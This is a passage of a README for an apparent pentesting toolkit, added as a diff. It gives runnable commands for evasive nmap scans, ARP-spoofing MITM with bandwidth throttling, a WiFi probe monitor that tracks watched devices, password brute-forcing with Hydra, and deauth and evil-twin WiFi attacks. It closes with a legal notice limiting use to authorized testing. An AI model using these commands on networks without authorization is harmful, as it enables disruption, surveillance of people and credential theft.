+### Port Scanning (Nmap)
+
+**Theory:**
+Port scanning determines which TCP/UDP ports are open on a target. Nmap supports multiple scan types:
+
+| Scan Type | Flag | Description |
+|-----------|------|-------------|
+| TCP Connect | `-sT` | Full TCP handshake (noisy, logged) |
+| SYN Scan | `-sS` | Half-open scan (stealthier, requires root) |
+| UDP Scan | `-sU` | UDP port discovery |
+| NULL/FIN/Xmas | `-sN/-sF/-sX` | Evasion techniques |
+
+**TCP SYN Scan (Half-Open) - How it works:**
+```
+Attacker         Target
+   │                │
+   │───SYN─────────►│
+   │                │
+   │◄──SYN/ACK──────│  (Port OPEN)
+   │                │
+   │───RST─────────►│  (Don't complete handshake)
+```
+
+If port is closed, target responds with RST. If filtered (firewall), no response.
+
+**Implementation:**
+```bash
+# recon.sh - Scan types
+quick_scan() {
+    nmap -T4 -F --open "$target"           # Fast, top 100 ports
+}
+
+full_scan() {
+    nmap -sV -sC -O -A -p- "$target"       # All 65535 ports, version detection
+}
+
+stealth_scan() {
+    nmap -sS -T2 -f -D RND:10 "$target"    # SYN scan, slow, fragmented, decoys
+}
+```
+
+---
+
+### Stealth Scanning
+
+**Theory:**
+To evade IDS/IPS systems, we use several evasion techniques:
+
+1. **Timing Control (`-T0` to `-T5`)**: Slower scans are harder to detect
+2. **Fragmentation (`-f`)**: Split packets into tiny fragments
+3. **Decoys (`-D RND:10`)**: Make scan appear to come from multiple IPs
+4. **Data Padding (`--data-length 25`)**: Add random data to packets
+
+**Implementation:**
+```bash
+# scenarios.sh - scenario_stealth_recon()
+# Stealth SYN scan with all evasion techniques
+nmap -sS -T2 -f --data-length 25 -D RND:10 "$target"
+```
+
+---
+
+### Vulnerability Scanning
+
+**Theory:**
+Nmap's NSE (Nmap Scripting Engine) includes vulnerability detection scripts that:
+- Check for known CVEs
+- Test default credentials
+- Identify misconfigurations
+
+**Implementation:**
+```bash
+# recon.sh - vuln_scan()
+nmap --script vuln "$target"
+```
+
+This runs scripts like:
+- `smb-vuln-ms17-010` (EternalBlue)
+- `ssl-heartbleed`
+- `http-shellshock`
+
+---
+
+### SMB Enumeration
+
+**Theory:**
+SMB (Server Message Block) on port 445 often reveals:
+- Shared folders
+- User accounts
+- Operating system version
+- Domain information
+
+**Implementation:**
+```bash
+# recon.sh - smb_enum()
+smb_enum() {
+    # Nmap SMB scripts
+    nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery "$target"
+    
+    # Enum4linux - comprehensive enumeration
+    enum4linux -a "$target"
+    
+    # List shares anonymously
+    smbclient -L "$target" -N
+}
+```
+
+---
+
+### DNS Enumeration
+
+**Theory:**
+DNS provides valuable reconnaissance data:
+- **A Records**: IP addresses
+- **MX Records**: Mail servers
+- **NS Records**: Nameservers
+- **Zone Transfer (AXFR)**: Complete DNS database (if misconfigured)
+
+**Implementation:**
+```bash
+# recon.sh - dns_enum()
+dns_enum() {
+    nslookup "$domain"           # Basic lookup
+    dig "$domain" ANY            # All record types
+    host "$domain"               # Reverse DNS
+    dig axfr "@$domain" "$domain"  # Zone transfer attempt
+}
+```
+
+---
+
+### Web Enumeration
+
+**Theory:**
+Web enumeration discovers:
+- Hidden directories/files
+- Backup files (.bak, .old)
+- Admin panels
+- API endpoints
+
+**Tools:**
+- **Gobuster**: Fast directory brute-forcing
+- **Nikto**: Web vulnerability scanner
+- **WhatWeb**: Technology fingerprinting
+
+**Implementation:**
+```bash
+# recon.sh - web_enum()
+web_enum() {
+    gobuster dir -u "$target" -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
+}
+
+# scenarios.sh includes full web hunting:
+# - Gobuster for directories
+# - WhatWeb for tech stack
+# - Nikto for vulnerabilities
+# - SQLmap for injection testing
+```
+
+---
+
+## Man-in-the-Middle Attacks
+
+### ARP Spoofing
+
+**Theory:**
+ARP has no authentication. An attacker can send gratuitous ARP replies claiming to be the gateway, causing victims to send all traffic through the attacker.
+
+```
+Before Attack:
+Victim ───────────► Gateway ───────────► Internet
+
+After ARP Spoof:
+Victim ───────────► Attacker ───────────► Gateway ───────────► Internet
+```
+
+**ARP Poisoning Process:**
+```
+1. Tell Victim: "I am the Gateway" (attacker's MAC for gateway IP)
+2. Tell Gateway: "I am the Victim" (attacker's MAC for victim IP)
+3. Enable IP forwarding to relay traffic
+4. Intercept/modify all traffic
+```
+
+**Implementation:**
+```bash
+# wifi_throttle.sh
+enable_forwarding() {
+    echo 1 > /proc/sys/net/ipv4/ip_forward  # Allow traffic forwarding
+}
+
+# Bidirectional ARP spoofing
+arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &   # Tell victim we're gateway
+arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP &   # Tell gateway we're victim
+```
+
+---
+
+### Bandwidth Throttling
+
+**Theory:**
+Once we're the MITM, we use Linux **Traffic Control (tc)** to rate-limit traffic:
+
+**TC Architecture:**
+```
+                      ┌─────────┐
+  Incoming Traffic ──►│  qdisc  │──► Outgoing Traffic
+                      │  (HTB)  │
+                      └────┬────┘
+                           │
+                      ┌────▼────┐
+                      │  class  │  ← Rate limit applied here
+                      │  (1:1)  │
+                      └─────────┘
+```
+
+**Implementation:**
+```bash
+# wifi_throttle.sh
+# Clear existing rules
+tc qdisc del dev $INTERFACE root
+
+# Add HTB (Hierarchical Token Bucket) qdisc
+tc qdisc add dev $INTERFACE root handle 1: htb default 11
+
+# Add class with bandwidth limit (e.g., 56kbit = dial-up speed)
+tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 56kbit
+tc class add dev $INTERFACE parent 1:1 classid 1:11 htb rate 56kbit
+```
+
+**Speed Options:**
+- `56kbit` - Dial-up (extremely slow)
+- `256kbit` - Images load slowly
+- `1mbit` - YouTube buffers
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_throttle.sh
+# Then select target and speed interactively
+```
+
+---
+
+## Python Tools
+
+### Smart Scanner
+
+**Theory:**
+Automated enumeration that chains tools based on discovered services:
+
+```
+Port Found → Service Identified → Run Specific Attacks
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+   80/443  → HTTP/HTTPS          → Nikto + Gobuster
+   445     → SMB                  → SMB vuln scripts + enum4linux
+   22      → SSH                  → Algorithm audit
+```
+
+**Implementation (smart_scan.py):**
+```python
+def scan_target(target, output_dir):
+    # Phase 1: Fast port discovery
+    nmap_cmd = f"nmap -T4 -F {target}"
+    open_ports = parse_results()
+    
+    # Phase 2: Service version detection
+    nmap_cmd = f"nmap -sV -sC -p {ports} {target}"
+    
+    # Phase 3: Targeted attacks based on services
+    if '80' in open_ports or '443' in open_ports:
+        run_nikto(target)
+        run_gobuster(target)
+    
+    if '445' in open_ports:
+        run_smb_vuln_scan(target)
+        run_enum4linux(target)
+    
+    if '22' in open_ports:
+        run_ssh_audit(target)
+```
+
+---
+
+### Packet Visualizer
+
+**Theory:**
+Uses Scapy to capture and display network packets in a "Matrix-style" terminal UI. Captures TCP, UDP, ICMP traffic and displays source/destination with port information.
+
+**Implementation (packet_visualizer.py):**
+```python
+from scapy.all import sniff, IP, TCP, UDP, ICMP
+
+def process_packet(packet):
+    if TCP in packet:
+        info = f"TCP {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}"
+    elif UDP in packet:
+        info = f"UDP {packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}"
+    # Display with curses for terminal UI
+
+sniff(filter="not port 22", prn=process_packet) # Exclude SSH to avoid loops
+```
+
+---
+
+### WiFi Monitor
+
+**Theory:**
+Monitors **802.11 Probe Requests** - frames sent by devices searching for known networks. Reveals:
+- Device MAC addresses
+- Networks the device has connected to before
+- Device presence/proximity
+
+**Use Cases:**
+- Track when specific devices enter range
+- Identify what networks people connect to
+- Device inventory
+
+**Implementation (wifi_monitor.py):**
+```python
+from scapy.all import sniff, Dot11ProbeReq
+
+WATCHLIST = {}  # MAC -> Name mapping for alerts
+
+def packet_callback(pkt):
+    if pkt.haslayer(Dot11ProbeReq):
+        mac = pkt.addr2
+        ssid = pkt.info.decode('utf-8') if pkt.info else "Hidden"
+        rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
+        
+        if mac.lower() in WATCHLIST:
+            print(f"ALERT: {WATCHLIST[mac]} detected! Searching for '{ssid}'")
+        else:
+            print(f"New Device: {mac} searching for '{ssid}'")
+
+sniff(iface="wlan1mon", prn=packet_callback)
+```
+
+---
+
+## Password Attacks
+
+### Integrated Tools
+
+**Hydra** - Online brute-force:
+```bash
+# SSH brute force
+hydra -l admin -P wordlist.txt ssh://192.168.1.1
+
+# FTP brute force
+hydra -l admin -P wordlist.txt ftp://192.168.1.1
+
+# HTTP POST form
+hydra -l admin -P wordlist.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'
+```
+
+**John the Ripper** - Offline hash cracking:
+```bash
+john hashfile --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**Hashcat** - GPU-accelerated cracking:
+```bash
+hashcat -m 0 -a 0 hashes.txt wordlist.txt  # MD5
+hashcat -m 22000 hash.hc22000 wordlist.txt # WPA
+```
+
+---
+
+## Exploitation Tools
+
+| Tool | Purpose | Usage |
+|------|---------|-------|
+| **Metasploit** | Exploitation framework | `msfconsole` |
+| **SQLMap** | Automated SQL injection | `sqlmap -u URL --batch` |
+| **Responder** | LLMNR/NBT-NS poisoning | `sudo responder -I eth0` |
+| **Bettercap** | Network MITM framework | `sudo bettercap` |
+
+---
+
+## Automated Attack Scenarios
+
+Pre-configured workflows in `scenarios.sh`:
+
+### Scenario 1: WiFi Audit
+Complete wireless assessment:
+1. Scan all networks (duration-based)
+2. Capture handshakes
+3. Attempt WPS attacks
+4. Generate report
+
+### Scenario 2: Network Sweep
+Full network discovery:
+1. Host discovery (nmap -sn)
+2. All-port scan
+3. Vulnerability scan
+4. OS detection
+
+### Scenario 3: Web Application Hunt
+1. Find web servers (80, 443, 8080, 8443)
+2. Directory enumeration (Gobuster)
+3. Technology detection (WhatWeb)
+4. Nikto vulnerability scan
+5. SQL injection testing (SQLMap)
+
+### Scenario 4: Stealth Reconnaissance
+Low-profile intelligence gathering:
+- T1-T2 timing (Sneaky/Slow)
+- Packet fragmentation
+- 10 decoy IPs
+- Safe scripts only
+
+### Scenario 5: Quick Assessment
+5-10 minute security check:
+1. Fast host discovery
+2. Top 1000 ports
+3. Quick vuln check
+4. Risk assessment
+
+---
+
+## Web Dashboard
+
+Flask-based control interface (`dashboard/server.py`) providing:
+
+**API Endpoints:**
+| Endpoint | Function |
+|----------|----------|
+| `/api/system` | CPU, memory, temperature stats |
+| `/api/stats` | Attack statistics (handshakes, hosts, vulns) |
+| `/api/scan/start` | Initiate WiFi scan |
+| `/api/scan/results` | Get discovered networks |
+| `/api/action/deauth` | Execute deauth attack |
+| `/api/devices/list` | Discovered device inventory |
+| `/api/logs/live` | Real-time attack logs |
+
+**Features:**
+- Real-time system monitoring
+- Device inventory management
+- One-click attack execution
+- Live log streaming
+- Report generation
+
+**Start Dashboard:**
+```bash
+./scripts/core/dashboard.sh start
+# Access at http://<device-ip>:5000
+```
+
+---
+
+## Commands Reference
+
+### WiFi Tools
+```bash
+sudo ./scripts/network/wifi_tools.sh --scan              # Scan networks
+sudo ./scripts/network/wifi_tools.sh --handshake BSSID CH # Capture handshake
+sudo ./scripts/network/wifi_tools.sh --deauth BSSID 0    # Continuous deauth
+sudo ./scripts/network/wifi_tools.sh --evil-twin SSID CH # Evil Twin AP
+sudo ./scripts/network/wifi_tools.sh --crack file.cap    # Crack handshake
+sudo ./scripts/network/wifi_tools.sh --pmkid 300         # PMKID capture
+sudo ./scripts/network/wifi_tools.sh --pixie BSSID       # WPS Pixie Dust
+sudo ./scripts/network/wifi_tools.sh --beacon            # Beacon flood
+sudo ./scripts/network/wifi_tools.sh --auth BSSID        # Auth flood
+```
+
+### Reconnaissance
+```bash
+sudo ./scripts/network/recon.sh --quick 192.168.1.0/24   # Fast scan
+sudo ./scripts/network/recon.sh --full 192.168.1.100     # Full port scan
+sudo ./scripts/network/recon.sh --stealth 192.168.1.100  # Stealth scan
+sudo ./scripts/network/recon.sh --vuln 192.168.1.100     # Vuln scan
+sudo ./scripts/network/recon.sh --smb 192.168.1.100      # SMB enum
+sudo ./scripts/network/recon.sh --dns example.com        # DNS enum
+sudo ./scripts/network/recon.sh --web http://target      # Web enum
+sudo ./scripts/network/recon.sh --discover               # Network discovery
+sudo ./scripts/network/recon.sh --comprehensive TARGET   # Full assessment
+```
+
+### Python Tools
+```bash
+sudo python3 scripts/python/smart_scan.py TARGET         # Smart enumeration
+sudo python3 scripts/python/packet_visualizer.py         # Traffic monitor
+sudo python3 scripts/python/wifi_monitor.py wlan1mon     # Probe monitor
+```
+
+### Bandwidth Throttle
+```bash
+sudo ./scripts/network/wifi_throttle.sh                  # Interactive MITM
+```
+
+---
+
+## Legal Notice
+
+This tool is provided for **authorized penetration testing** and **educational purposes** only. Unauthorized access to computer systems is a criminal offense under laws including:
+
+- **USA**: Computer Fraud and Abuse Act (CFAA)
+- **UK**: Computer Misuse Act 1990
+- **EU**: Directive on attacks against information systems
+
+**Always obtain written authorization before testing any network or system.**
+
+---
+
+*Created by void0x11 • VoidPWN Pentesting Framework*
